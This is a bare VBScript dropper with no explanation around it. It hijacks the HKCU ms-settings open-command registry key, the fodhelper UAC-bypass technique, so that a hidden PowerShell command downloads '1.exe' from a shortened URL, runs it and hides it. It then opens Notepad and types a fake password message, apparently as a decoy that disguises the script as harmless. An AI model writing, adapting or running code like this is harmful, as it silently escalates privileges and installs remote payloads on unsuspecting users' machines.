Const HKEY_CURRENT_USER = &H80000001

Const FodHelperPath = "%tmp%"
Const RegKeyPathStr = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
Const DelegateExecRegKeyName = "DelegateExecute"
Const DelegateExecRegKeyValue = ""
Const DefaultRegKeyName = ""
Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command;(new-object System.Net.WebClient).DownloadFile('https://is.gd/onorum','1.exe');./'1.exe';(get-item '1.exe').Attributes += 'Hidden';"

Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
Set Registry = GetObject(RegObjectPath)

Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue

Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "C:\\Windows\\System32\\notepad.exe"

WScript.Sleep 1000

Notepad.SendKeys "Password is: ####1234####"
